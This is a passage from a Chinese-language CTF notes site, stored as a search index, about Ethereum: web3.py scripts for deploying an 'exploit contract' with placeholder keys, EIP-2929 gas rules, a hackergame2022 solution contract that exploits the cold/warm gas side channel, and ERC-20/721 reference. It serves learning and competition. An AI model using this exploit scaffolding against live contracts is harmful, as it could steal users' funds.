w3.eth.sendRawTransaction(transaction).hex()\n    txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\n    return txn_receipt\n\nprint(\"[+] Deploying exploit contract...\")\ntxn_receipt = transact(hacker, None, bytes.fromhex(\"...\"))\nprint(txn_receipt)\nprint(\"[*] Exploit contract deployed at\", txn_receipt['contractAddress'])\ncontractAddress = txn_receipt['contractAddress']\n</code></pre> <pre><code>from web3 import Web3, HTTPProvider\n# from rich import print\nimport json\n\nw3 = Web3(HTTPProvider('...'))\n\nhacker = \"...\"\ntarget = \"...\"\nprivateKey = \"...\"\n\ndef run(sender, func, value=0, gas=0x200000):\n    txn = func.buildTransaction({\n        'nonce': w3.eth.getTransactionCount(sender),\n        'gas': gas,\n        'gasPrice': w3.toWei(1.1, 'gwei'),\n        \"value\": w3.toWei(value, 'ether'),\n    })\n    if gas == None:\n        txn['gas'] = w3.eth.estimateGas(txn)\n    transaction = w3.eth.account.signTransaction(txn, privateKey).rawTransaction\n    txn_hash = w3.eth.sendRawTransaction(transaction).hex()\n    txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)\n    return txn_receipt\n\nbytecode, abi = json.load(open(\"Exploit.json\"))\nexploitContract = w3.eth.contract(abi=abi, bytecode=bytecode)\n\nprint(\"[+] Deploying exploit contract...\")\ntxn_receipt = run(hacker, exploitContract.constructor(target))\nprint(\"[*] Exploit contract deployed at\", txn_receipt['contractAddress'])\nexploitContract = w3.eth.contract(abi=abi, address=txn_receipt['contractAddress'])\n</code></pre></p>"},{"location":"ctf/blockchain/eth/basic/#remix-metamask","title":"Remix + MetaMask","text":"<p>Remix IDE \u63d0\u4f9b\u4e86\u8c03\u8bd5\u7684 Javascript VM\uff0c\u540c\u65f6\u4e5f\u53ef\u4ee5\u8fde\u63a5\u4ee5\u592a\u574a\u4e3b\u94fe\u3001\u6d4b\u8bd5\u94fe\uff0c\u8fd8\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u5230 Web3 Provider\uff0c\u4e5f\u53ef\u4ee5\u8fde\u63a5\u5230 Injected Provider\uff0c\u6bd4\u5982 MetaMask\u3002MetaMask \u4e2d\u4e5f\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u7f51\u7edc\u3002</p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u5728 Remix \u4e2d\u8fdb\u884c\u5408\u7ea6\u7684\u90e8\u7f72\u548c\u8c03\u7528\u4e86\u3002</p> <p>\u4e0d\u8fc7\u5bf9\u4e8e CTF \u9898\u76ee\u6765\u8bf4\u53ef\u80fd\u4e0d\u592a\u597d\u7528\u3002\u6211\u4e00\u822c\u4f1a\u9009\u62e9\u5728 JS VM \u4e2d\u8c03\u8bd5\u597d\u540e\u901a\u8fc7 web3.py \u6765\u4ea4\u4e92\u3002</p>"},{"location":"ctf/blockchain/eth/eip/","title":"\u5176\u4f59\u91cd\u8981 EIPs","text":"<p> \u7ea6 600 \u4e2a\u5b57  33 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>Abstract</p> <p>\u9664\u4e86 ERC \u6807\u51c6\u4e2d\u63d0\u5230\u7684 EIP \u4ee5\u5916\u4e00\u4e9b\u6bd4\u8f83\u6709\u7528\u3001\u9700\u8981\u6ce8\u610f\u7684 EIP\u3002</p>"},{"location":"ctf/blockchain/eth/eip/#eip-2929","title":"EIP-2929","text":"<p>Gas cost increases for state access opcodes</p> <p>\u5305\u542b\u5728\u67cf\u6797\u786c\u5206\u53c9\u5f53\u4e2d\uff0c\u4fee\u6539\u4e86\u51e0\u4e2a\u548c\u72b6\u6001\u8bfb\u53d6\u3001\u5730\u5740\u8bbf\u95ee\u3001\u72b6\u6001\u4fee\u6539\u76f8\u5173\u7684\u5b57\u8282\u7801\u7684 gas \u6d88\u8017\u89c4\u5219\uff08\u964d\u4f4e\u53d7 DoS \u653b\u51fb\u98ce\u9669\uff09\u3002</p> <p>\u5728\u6267\u884c\u4ea4\u6613\u65f6\uff0c\u7ef4\u62a4\u4e24\u4e2a\u96c6\u5408 <code>accessed_addresses: Set[Address]</code>\u3001 <code>accessed_storage_keys: Set[Tuple[Address, Bytes32]]</code>\uff0c\u5206\u522b\u8bb0\u5f55\u8bbf\u95ee\u8fc7\u7684\u5730\u5740\u548c\u8bbf\u95ee\u8fc7\u7684\u5b58\u50a8\u952e\u3002</p> <p>\u4ea4\u6613\u6267\u884c\u5f00\u59cb\u65f6\u521d\u59cb\u5316\uff1a</p> <ul> <li>accessed_addresses \u5305\u62ec tx.sender\u3001tx.to\uff08\u6216\u5c06\u8981\u521b\u5efa\u5408\u7ea6\u7684\u5730\u5740\uff09\u548c\u5176\u5b83\u9884\u7f16\u8bd1\u7684\u5730\u5740</li> <li>accessed_storage_keys \u4e3a\u7a7a</li> </ul>"},{"location":"ctf/blockchain/eth/eip/#storage","title":"\u8bfb\u53d6 storage","text":"<p>\u5bf9\u4e8e CALL \u7cfb\u5217\u3001BALANCE \u4ee5\u53ca EXT \u7cfb\u5217\u5b57\u8282\u7801\uff08\u539f gas 700\uff09\uff1a</p> <ul> <li>\u5982\u679c\u8bbf\u95ee\u7684\u76ee\u7684\u5730\u5740\u4e0d\u5728 accessed_addresses \u4e2d\uff0c\u5219<ul> <li>\u6d88\u8017 COLD_ACCOUNT_ACCESS_COST = 2600 gas\uff08\u51b7\u8bfb\u53d6\uff09</li> <li>\u5c06\u5730\u5740\u6dfb\u52a0\u5230 accessed_addresses \u4e2d\uff08\u9884\u70ed\uff09</li> </ul> </li> <li>\u5982\u679c\u8bbf\u95ee\u7684\u76ee\u7684\u5730\u5740\u5728\u5176\u4e2d\uff0c\u5219\uff1a<ul> <li>\u6d88\u8017 WARM_STORAGE_READ_COST = 100 gas\uff08\u70ed\u8bfb\u53d6\uff09</li> </ul> </li> </ul> <p>\u5bf9\u4e8e SLOAD\uff08\u539f gas 800\uff09\uff1a</p> <ul> <li>\u5982\u679c (address, storage_key) \u5bf9\u4e0d\u5728 accessed_storage_keys \u4e2d\uff0c\u5219<ul> <li>\u6d88\u8017 COLD_SLOAD_COST = 2100 gas</li> <li>\u5c06 (address, storage_key) \u5bf9\u6dfb\u52a0\u5230 accessed_storage_keys \u4e2d</li> <li>*\u5176\u4e2d address \u8868\u793a\u8981\u8bfb\u53d6 storage \u7684\u5408\u7ea6\u5730\u5740\uff0cstorage_key \u8868\u793a\u8981\u8bfb\u53d6\u7684 storage key\uff08slot\uff09</li> </ul> </li> <li>\u5982\u679c (address, storage_key) \u5bf9\u5728\u5176\u4e2d\uff0c\u5219<ul> <li>\u6d88\u8017 WARM_STORAGE_READ_COST = 100 gas</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/eip/#storage_1","title":"\u5199\u5165 storage","text":"<p>\u5bf9\u4e8e SSTORE\uff08\u539f gas 5000\uff09\uff1a</p> <ul> <li>\u5982\u679c (address, storage_key) \u5bf9\u4e0d\u5728 accessed_storage_keys \u4e2d\uff0c\u5219<ul> <li>\u6d88\u8017 COLD_SSTORE_COST = 2100 gas</li> <li>\u5c06 (address, storage_key) \u5bf9\u6dfb\u52a0\u5230 accessed_storage_keys \u4e2d</li> <li>\u6d88\u8017 5000 - COLD_SSTORE_COST = 2900 gas \u8fdb\u884c\u5199\u5165</li> <li>*\u603b\u8ba1\u4ecd\u4e3a 5000 gas</li> </ul> </li> <li>\u5982\u679c (address, storage_key) \u5bf9\u5728\u5176\u4e2d\uff0c\u5219<ul> <li>\u53ea\u6d88\u8017 5000 - COLD_SSTORE_COST = 2900 gas \u8fdb\u884c\u5199\u5165</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/eip/#selfdestruct","title":"selfdestruct","text":"<p>\u5bf9\u4e8e SELFDESTRUCT\uff08\u539f gas 5000\uff09\u4e5f\u6709\u66f4\u6539\uff0c\u56e0\u4e3a\u5176\u81ea\u6bc1\u8f6c\u79fb\u4f59\u989d\u65f6\u4f1a\u8bbf\u95ee\u5176\u5b83\u5730\u5740\uff0c\u4f46\u89c4\u5219\u548c\u524d\u9762\u7a0d\u6709\u4e0d\u540c\uff1a</p> <ul> <li>\u5982\u679c\u63a5\u6536\u8005\u5730\u5740\u4e0d\u5728 accessed_addresses \u4e2d\uff0c\u5219<ul> <li>\u6d88\u8017 COLD_ACCOUNT_ACCESS_COST = 2600 gas</li> <li>\u5c06\u5730\u5740\u6dfb\u52a0\u5230 accessed_addresses \u4e2d</li> <li>\u6d88\u8017 5000 gas \u8fdb\u884c\u81ea\u6bc1</li> </ul> </li> <li>\u5982\u679c\u63a5\u6536\u8005\u5730\u5740\u5728\u5176\u4e2d\uff0c\u5219<ul> <li>\u53ea\u6d88\u8017 5000 gas \u8fdb\u884c\u81ea\u6bc1</li> <li>*\u4e0d\u4f1a\u518d\u6d88\u8017 WARM_STORAGE_READ_COST = 100 gas</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/eip/#_1","title":"\u7528\u4f8b","text":"<p>hackergame2022 \u7684\u94fe\u4e0a\u9884\u8a00\u5bb6\u7b2c\u4e09\u95ee\u8981\u4f7f\u7528\u8fd9\u4e00\u7279\u6027\uff0c\u56e0\u4e3a\u5b83\u9700\u8981\u5728\u4e0d\u4fee\u6539\u72b6\u6001\u7684\u60c5\u51b5\u4e0b\u5728\u4e00\u6b21\u4ea4\u6613\u4e2d\u8bb0\u4e0b\u4e00\u4e2a\u503c\u5e76\u8f93\u51fa\uff1a</p> \u9898\u76ee\u5408\u7ea6 <pre><code>pragma solidity =0.8.17;\n\ninterface MemoryMaster {\n    function memorize(uint256 n) external view;\n    function recall() external view returns (uint256);\n}\n\ncontract Challenge {\n    function test(MemoryMaster m, uint256 n) external returns (bool) {\n        m.memorize(n);\n        uint256 recalled = m.recall();\n        return recalled == n;\n    }\n}\n</code></pre> <p>\u89e3\u6cd5\u5c31\u662f\u5229\u7528\u63d2\u69fd\u51b7\u70ed\u8bfb\u53d6 gas \u6d88\u8017\u7684\u8f83\u5927\u5dee\u5f02\uff0c\u6765\u9010\u4f4d\u8bb0\u5f55\uff1a</p> exp <pre><code>contract Exploit {\n    function memorize(uint256 n) external view {\n        for (uint i = 0; i &lt; 256; ++i) {\n            if ((n &gt;&gt; i) &amp; 1 == 1) check(1218+i); // \u7b2c\u4e00\u6b21 check\uff0c\u662f\u51b7\u7684\n        }\n    }\n    function recall() external view returns (uint256) {\n        uint256 res;\n        for (uint i = 0; i &lt; 256; ++i) {\n            if (check(1218+i)) res |= 1 &lt;&lt; i; // \u5982\u679c\u524d\u9762 check \u8fc7\u4e86\uff0c\u5c31\u662f\u70ed\u7684\uff0cgas \u6d88\u8017\u5c11\u4e8e 1k\uff0c\u4f1a\u8fd4\u56de true\n        }\n        return res;\n    }\n    function check(uint256 x) internal view returns (bool) {\n        uint gas = gasleft();\n        uint b = address(uint160(x)).balance; // \u5229\u7528 BALANCE \u5b57\u8282\u7801\n        return gas - gasleft() &lt; 1000;\n    }\n}\n</code></pre>"},{"location":"ctf/blockchain/eth/erc/","title":"ERC \u6807\u51c6","text":"<p> \u7ea6 1933 \u4e2a\u5b57  99 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p> <p>Abstract</p> <p>\u5206\u6790\u3001\u8bb0\u5f55\u4e00\u4e9b\u5e38\u7528\u7684 ERC \u6807\u51c6</p>"},{"location":"ctf/blockchain/eth/erc/#eip-erc","title":"EIP \u4e0e ERC","text":"<p>EIP\uff08Ethereum Improvement Proposals\uff0c\u4ee5\u592a\u574a\u6539\u8fdb\u63d0\u6848\uff09\u662f\u5f00\u53d1\u8005\u6539\u8fdb\u4ee5\u592a\u574a\u5e73\u53f0\u7684\u63d0\u6848\u5217\u8868\uff08\u7c7b\u4f3c python \u7684 pep\uff09\uff0c\u5305\u542b\u4e86\u5f88\u591a\u65b9\u9762\u7684\u5185\u5bb9\uff0c\u6709\u6838\u5fc3\u534f\u8bae\u3001\u5ba2\u6237\u7aef API\u3001\u5408\u7ea6\u6807\u51c6\u7b49\u2026\u2026 \u53ef\u4ee5\u5728 eips.ethereum.org \u627e\u5230\u5168\u90e8\u7684 EIP \u5217\u8868\u3002</p> <p>\u5176\u4e2d\u4e0e\u6807\u51c6\u6709\u5173\u7684\u79f0\u4e3a ERC\uff08Ethereum Request for Comment\uff09\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u5b9e\u7528\u7684\u6807\u51c6\u3002\u800c\u4e14 OpenZeppelin \u4e5f\u5b9e\u73b0\u4e86\u5176\u4e2d\u7684\u4e00\u4e9b\u5408\u7ea6\u6807\u51c6  OpenZeppelin/openzeppelin-contracts</p> <p>\u4e0b\u9762\u6765\u5206\u522b\u770b\u4e00\u4e0b\u5176\u4e2d\u51e0\u4e2a\u7ecf\u5178\u5e38\u7528\u7684 ERC</p>"},{"location":"ctf/blockchain/eth/erc/#erc-20","title":"ERC-20","text":"<p>ERC-20 \u89c4\u5b9a\u4e86\u4e00\u4e2a\u4ee3\u5e01\uff08token\uff09\u6807\u51c6\uff0c\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u57fa\u7840\u7684\u65b9\u6cd5\uff0c\u5305\u62ec\u8f6c\u79fb\u4ee3\u5e01\u3001\u6388\u6743\u7b49\u3002</p>"},{"location":"ctf/blockchain/eth/erc/#_1","title":"\u6807\u51c6","text":"<ul> <li>name\uff1atoken \u540d\u79f0\uff08\u53ef\u9009\u9879\uff09     <pre><code>function name() public view returns (string)\n</code></pre></li> <li>symbol\uff1atoken \u7b26\u53f7\uff08\u53ef\u9009\u9879\uff09     <pre><code>function symbol() public view returns (string)\n</code></pre></li> <li>decimals\uff1atoken \u7cbe\u5ea6\uff08\u53ef\u9009\u9879\uff09     <pre><code>function decimals() public view returns (uint8)\n</code></pre><ul> <li>\u4f8b\u5982\uff0cdecimals \u4e3a 2\uff0c\u8868\u793a\u5f53\u524d\u4e00\u4e2a token \u53ef\u4ee5\u88ab\u5206\u6210 100 \u4efd</li> <li>\u67e5\u8be2\u4f59\u989d\u65f6\u8fd4\u56de\u7684\u662f\u6700\u5c0f\u7cbe\u5ea6\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0cmint \u4e86 1 token \u4e4b\u540e\uff0c\u67e5\u8be2\u5230\u7684\u662f 100</li> <li>\u7c7b\u6bd4 ETH\uff0c\u5176 decimals \u662f 18\uff0c\u4e5f\u5c31\u662f 1 ether \u548c 1 wei \u7684\u5173\u7cfb</li> </ul> </li> </ul> <p>\u4ee5\u4e0a\u53ef\u9009\u9879\u90fd\u662f\u4e3a\u4e86\u6613\u7528\u6027\u800c\u589e\u52a0\u7684\uff0c\u4e0d\u5fc5\u987b\u63d0\u4f9b\uff0c\u800c\u4e14\u5176\u5b83\u5408\u7ea6\u4e0d\u80fd\u9ed8\u8ba4\u8be5 ERC-20 token \u6709\u8fd9\u4e9b\u51fd\u6570\u3002\u4ee5\u4e0b\u662f\u6807\u51c6\u8981\u6c42\u5fc5\u987b\u63d0\u4f9b\u7684\u51fd\u6570\uff1a</p> <ul> <li>totalSupply\uff1a\u53d1\u884c\u7684 token \u603b\u91cf     <pre><code>function totalSupply() public view returns (uint256)\n</code></pre><ul> <li>\u53ef\u4ee5\u901a\u8fc7 <code>uint256 public totalSupply;</code> \u6765\u5b9e\u73b0</li> </ul> </li> <li>balanceOf\uff1a\u67d0\u4e2a\u5730\u5740\u4e0a\u62e5\u6709\u7684 token \u6570\u91cf     <pre><code>function balanceOf(address _owner) public view returns (uint256 balance)\n</code></pre><ul> <li>\u53ef\u4ee5\u901a\u8fc7 <code>mapping (address =&gt; uint256) public balanceOf;</code> \u6765\u5b9e\u73b0</li> </ul> </li> <li>transfer\uff1a\u8f6c\u79fb token     <pre><code>function transfer(address _to, uint256 _value) public returns (bool success)\n</code></pre><ul> <li>\u4ece msg.sender \u8f6c\u79fb _value \u4e2a token \u5230 _to</li> <li>\u4f1a\u89e6\u53d1 <code>Transfer</code> \u4e8b\u4ef6\uff08\u5373\u4f7f _value \u4e3a 0\uff09</li> </ul> </li> <li>transferFrom\uff1a\u4ece\u67d0\u4e2a\u5730\u5740\u8f6c\u79fb token     <pre><code>function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)\n</code></pre><ul> <li>\u4ece _from \u8f6c\u79fb _value \u4e2a token \u5230 _to</li> <li>\u4f1a\u89e6\u53d1 <code>Transfer</code> \u4e8b\u4ef6\uff08\u5373\u4f7f _value \u4e3a 0\uff09</li> <li>\u7528\u4e8e\u4ee3\u7406\u8f6c\u79fb\uff0c\u9700\u8981 _from \u5148\u6388\u6743 msg.sender \u8f6c\u79fb token</li> </ul> </li> <li>approve\uff1a\u6388\u6743\u67d0\u4e2a\u5730\u5740\u4ee3\u7406\u8f6c\u79fb token     <pre><code>function approve(address _spender, uint256 _value) public returns (bool success)\n</code></pre><ul> <li>\u6388\u6743 _spender \u6700\u591a\u8f6c\u79fb _value \u4e2a token</li> <li>\u4f1a\u89e6\u53d1 <code>Approval</code> \u4e8b\u4ef6\uff08\u5373\u4f7f _value \u4e3a 0\uff09</li> </ul> </li> <li>allowance\uff1a\u67e5\u8be2\u67d0\u4e2a\u5730\u5740\u53ef\u4ee5\u4ee3\u7406\u8f6c\u79fb\u7684 token \u6570\u91cf     <pre><code>function allowance(address _owner, address _spender) public view returns (uint256 remaining)\n</code></pre></li> </ul> <p>\u4e00\u4e9b\u4f1a\u89e6\u53d1\u7684\u4e8b\u4ef6\uff1a</p> <ul> <li>Transfer\uff1atoken \u8f6c\u79fb     <pre><code>event Transfer(address indexed _from, address indexed _to, uint256 _value)\n</code></pre></li> <li>Approval\uff1a\u6388\u6743     <pre><code>event Approval(address indexed _owner, address indexed _spender, uint256 _value)\n</code></pre></li> </ul> <p>\u5b8c\u6574\u7684\u63a5\u53e3\uff1a <pre><code>interface IERC20 {\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address who) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function transfer(address to, uint256 value) external returns (bool);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n</code></pre></p>"},{"location":"ctf/blockchain/eth/erc/#_2","title":"\u5b9e\u73b0","text":"<p>OpenZeppelin \u7684\u5b9e\u73b0\uff1aERC20.sol <pre><code>import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\"\n</code></pre></p>"},{"location":"ctf/blockchain/eth/erc/#_3","title":"\u6269\u5c55","text":"<p>OpenZeppelin \u8fd8\u5b9e\u73b0\u4e86\u4e00\u7cfb\u5217\u6269\u5c55\u7684\u5408\u7ea6\uff1aERC20/extensions</p> <ul> <li>ERC20Burnable<ul> <li>\u5b9e\u73b0\u4e86 burn\u3001burnFrom \u51fd\u6570\uff0c\u7528\u4e8e\u9500\u6bc1 token</li> </ul> </li> <li>ERC20Capped<ul> <li>\u5b9e\u73b0\u4e86 cap \u51fd\u6570\uff0c\u7528\u4e8e\u9650\u5236 token \u603b\u91cf</li> </ul> </li> <li>ERC20FlashMint<ul> <li>\u5b9e\u73b0\u4e86 ERC-3156 \u7684\u95ea\u7535\u8d37\u63a5\u53e3</li> </ul> </li> <li>...</li> </ul>"},{"location":"ctf/blockchain/eth/erc/#erc-721","title":"ERC-721","text":"<p>ERC-721 \u662f\u4e00\u4e2a NFT\uff08Non-Fungible Token\uff0c\u975e\u540c\u8d28\u5316\u4ee3\u5e01\uff09\u6807\u51c6\u3002\u201c\u975e\u540c\u8d28\u5316\u201d \u6307\u7684\u662f\uff0c\u76f8\u5bf9\u4e8e ERC-20 \u7684 token \u4e00\u79cd\u4ee3\u5e01\u53ef\u4ee5\u53d1\u884c\u5f88\u591a\u4e2a\uff0c\u800c NFT \u4e00\u79cd\u4ee3\u5e01\u53ea\u80fd\u53d1\u884c\u4e00\u4e2a\u7ed9\u4e00\u4e2a\u5730\u5740\u3002</p> <p>ERC-721 \u89c4\u8303\u89c4\u5b9a\u4e86\u8fd9\u6837\u4e00\u79cd\u4ee3\u5e01\u89c4\u8303\uff0c\u652f\u6301\u53d1\u884c\u591a\u79cd NFT\uff0c\u6bcf\u4e2a NFT \u6709\u4e00\u4e2a\u6807\u8bc6\u7b26\uff0c\u5373 tokenId\uff0c\u6bcf\u4e2a NFT \u53ea\u80fd\u5c5e\u4e8e\u4e00\u4e2a\u5730\u5740\u3002\u4e14\u53ef\u4ee5\u8fdb\u884c NFT \u7684\u8f6c\u79fb\u3001\u6388\u6743\u3001\u67e5\u8be2\u3002</p> <p>\u4e0d\u540c\u4e8e ERC-20\uff0c\u5b83\u7684\u6388\u6743\u673a\u5236\u6709\u4e24\u79cd\u65b9\u6848\uff1a</p> <ul> <li>\u4e00\u4e2a\u8d26\u6237\u5c06\u5b83\u6240\u62e5\u6709\u7684\u4e00\u4e2a NFT \u6388\u6743\u7ed9\u53e6\u4e00\u4e2a\u8d26\u6237\u6765\u64cd\u4f5c\uff08\u4e00\u4e2a NFT \u53ea\u80fd\u6388\u6743\u7ed9\u4e00\u4e2a\u8d26\u6237\uff09</li> <li>\u4e00\u4e2a\u8d26\u6237\u6388\u6743\u53e6\u4e00\u4e2a\u8d26\u6237\u6765\u5bf9\u5176\u62e5\u6709\u7684\u5168\u90e8 NFT \u8fdb\u884c\u64cd\u4f5c</li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_4","title":"\u6807\u51c6\u63a5\u53e3","text":""},{"location":"ctf/blockchain/eth/erc/#_5","title":"\u8f6c\u79fb","text":"<ul> <li>safeTransferFrom\uff1a\u5b89\u5168\u5730\u8f6c\u79fb NFT     <pre><code>function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes _data) external payable\n</code></pre><ul> <li>\u5c06 _from \u62e5\u6709\u7684 _tokenId \u6807\u8bc6\u7684 NFT \u8f6c\u79fb\u7ed9 _to</li> <li>\u5982\u679c _to \u662f\u4e00\u4e2a\u5408\u7ea6\u5730\u5740\uff0c\u4f1a\u8c03\u7528\u5176 <code>onERC721Received</code> \u51fd\u6570\uff0c\u68c0\u67e5\u8fd4\u56de\u503c\u662f\u5426\u662f\u8fd9\u4e2a\u51fd\u6570\u7684 selector     <pre><code>function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes _data) external returns(bytes4)\n</code></pre><ul> <li>\u5b9e\u73b0\u65f6\u53ef\u4ee5\u8fd4\u56de <code>bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))</code></li> <li>\u4e5f\u53ef\u4ee5\u8fd4\u56de this.onERC721Received.selector</li> </ul> </li> <li>msg.sender \u53ea\u5141\u8bb8\u662f\u5f53\u524d\u8981\u8f6c\u79fb\u7684 NFT \u7684\u6240\u6709\u8005\u3001\u6240\u6709\u8005\u7684\u6388\u6743\u64cd\u4f5c\u8005\u3001\u6240\u6709\u8005\u6388\u6743\u64cd\u4f5c\u8fd9\u679a NFT \u7684\u64cd\u4f5c\u8005</li> <li>_to \u4e0d\u80fd\u662f 0 \u5730\u5740</li> <li>\u4f1a\u89e6\u53d1 <code>Transfer</code> \u4e8b\u4ef6</li> </ul> </li> <li>safeTransferFrom <pre><code>function safeTransferFrom(address _from, address _to, uint256 _tokenId) external payable\n</code></pre><ul> <li>\u4e0e\u4e0a\u9762\u7684\u51fd\u6570\u4e00\u6837\uff0c\u53ea\u662f\u4e0d\u9700\u8981\u4f20\u5165 _data\uff08\u4e3a \"\"\uff09</li> </ul> </li> <li>transferFrom\uff1a\u8f6c\u79fb NFT     <pre><code>function transferFrom(address _from, address _to, uint256 _tokenId) external payable\n</code></pre><ul> <li>\u4e0e\u4e0a\u9762\u7684\u8f6c\u79fb\u51fd\u6570\u7c7b\u4f3c\uff0c\u4e0d\u8fc7\u4e0d\u68c0\u67e5 _to \u662f\u5408\u7ea6\u65f6\u662f\u5426\u6b63\u786e\u5b9e\u73b0\u4e86 <code>onERC721Received</code> \u51fd\u6570</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_6","title":"\u6388\u6743","text":"<ul> <li>approve\uff1a\u6388\u6743\u64cd\u4f5c\u8005\u64cd\u4f5c\u5355\u4e2a NFT     <pre><code>function approve(address _approved, uint256 _tokenId) external payable\n</code></pre><ul> <li>\u5c06 _tokenId \u6807\u8bc6\u7684 NFT \u6388\u6743\u7ed9 _approved \u64cd\u4f5c</li> <li>msg.sender \u53ea\u5141\u8bb8\u662f\u5f53\u524d\u8981\u8f6c\u79fb\u7684 NFT \u7684\u6240\u6709\u8005\u3001\u6240\u6709\u8005\u7684\u6388\u6743\u64cd\u4f5c\u8005</li> <li>\u4e00\u4e2a NFT \u53ea\u80fd\u62e5\u6709\u4e00\u4e2a\u6388\u6743\u64cd\u4f5c\u8005</li> <li>\u4f1a\u89e6\u53d1 <code>Approval</code> \u4e8b\u4ef6</li> </ul> </li> <li>setApprovalForAll\uff1a\u6388\u6743/\u53d6\u6d88\u6388\u6743\u64cd\u4f5c\u8005\u64cd\u4f5c\u62e5\u6709\u7684\u6240\u6709 NFT     <pre><code>function setApprovalForAll(address _operator, bool _approved) external\n</code></pre><ul> <li>\u5c06 _operator \u6388\u6743/\u53d6\u6d88\u6388\u6743\u64cd\u4f5c\u6240\u6709 NFT</li> <li>msg.sender \u53ea\u5141\u8bb8\u662f\u5f53\u524d\u8981\u8f6c\u79fb\u7684 NFT \u7684\u6240\u6709\u8005\u3001\u6240\u6709\u8005\u7684\u6388\u6743\u64cd\u4f5c\u8005</li> <li>\u4f1a\u89e6\u53d1 <code>ApprovalForAll</code> \u4e8b\u4ef6</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_7","title":"\u67e5\u8be2","text":"<ul> <li>ownerOf\uff1a\u67e5\u8be2\u4e00\u4e2a NFT \u7684\u62e5\u6709\u8005     <pre><code>function ownerOf(uint256 _tokenId) external view returns (address)\n</code></pre></li> <li>balanceOf\uff1a\u67e5\u8be2\u67d0\u4e2a\u5730\u5740\u62e5\u6709\u7684 NFT \u6570\u91cf     <pre><code>function balanceOf(address _owner) external view returns (uint256)\n</code></pre></li> <li>getApproved\uff1a\u67e5\u8be2\u67d0\u4e2a NFT \u7684\u6388\u6743\u64cd\u4f5c\u8005     <pre><code>function getApproved(uint256 _tokenId) external view returns (address)\n</code></pre></li> <li>isApprovedForAll\uff1a\u67e5\u8be2\u67d0\u4e2a\u5730\u5740\u662f\u5426\u88ab\u6388\u6743\u64cd\u4f5c\u67d0\u4e2a\u8d26\u6237\u7684\u6240\u6709 NFT     <pre><code>function isApprovedForAll(address _owner, address _operator) external view returns (bool)\n</code></pre></li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_8","title":"\u4e8b\u4ef6","text":"<ul> <li>Transfer\uff1a\u8f6c\u79fb NFT \u65f6\u89e6\u53d1     <pre><code>event Transfer(address indexed _from, address indexed _to, uint256 indexed _tokenId)\n</code></pre></li> <li>Approval\uff1a\u6388\u6743\u64cd\u4f5c\u8005\u64cd\u4f5c\u5355\u4e2a NFT \u65f6\u89e6\u53d1     <pre><code>event Approval(address indexed _owner, address indexed _approved, uint256 indexed _tokenId)\n</code></pre></li> <li>ApprovalForAll\uff1a\u6388\u6743/\u53d6\u6d88\u6388\u6743\u64cd\u4f5c\u8005\u64cd\u4f5c\u62e5\u6709\u7684\u6240\u6709 NFT \u65f6\u89e6\u53d1     <pre><code>event ApprovalForAll(address indexed _owner, address indexed _operator, bool _approved)\n</code></pre></li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_9","title":"\u6269\u5c55","text":""},{"location":"ctf/blockchain/eth/erc/#_10","title":"\u5143\u6570\u636e\u6269\u5c55","text":"<ul> <li>name\uff1a\u67e5\u8be2\u5f53\u524d\u5408\u7ea6\u53d1\u884c\u7684\u4e00\u7cfb\u5217 NFT \u7684\u540d\u79f0     <pre><code>function name() external view returns (string)\n</code></pre></li> <li>symbol\uff1a\u67e5\u8be2\u5f53\u524d\u5408\u7ea6\u53d1\u884c\u7684\u4e00\u7cfb\u5217 NFT \u7684\u7b26\u53f7     <pre><code>function symbol() external view returns (string)\n</code></pre></li> <li>tokenURI\uff1a\u67e5\u8be2\u67d0\u4e2a NFT \u7684\u5143\u6570\u636e     <pre><code>function tokenURI(uint256 _tokenId) external view returns (string)\n</code></pre><ul> <li>\u8fd4\u56de\u7684\u662f\u4e00\u4e2a URI\uff0c\u6307\u5411\u4e00\u4e2a JSON \u6587\u4ef6\uff0c\u5176\u5305\u542b\u4e86\u5143\u6570\u636e</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_11","title":"\u679a\u4e3e\u6269\u5c55","text":"<ul> <li>totalSupply\uff1a\u67e5\u8be2\u53d1\u884c\u7684 NFT \u603b\u6570     <pre><code>function totalSupply() external view returns (uint256)\n</code></pre></li> <li>tokenByIndex\uff1a\u6839\u636e\u7d22\u5f15\u67e5\u8be2 NFT     <pre><code>function tokenByIndex(uint256 _index) external view returns (uint256)\n</code></pre><ul> <li>_index &lt; totalSupply()</li> </ul> </li> <li>tokenOfOwnerByIndex\uff1a\u6839\u636e\u7d22\u5f15\u67e5\u8be2\u67d0\u4e2a\u5730\u5740\u62e5\u6709\u7684 NFT     <pre><code>function tokenOfOwnerByIndex(address _owner, uint256 _index) external view returns (uint256)\n</code></pre><ul> <li>_index &lt; balanceOf(_owner)</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/erc/#_12","title":"\u5b9e\u73b0","text":"<p>OpenZeppelin 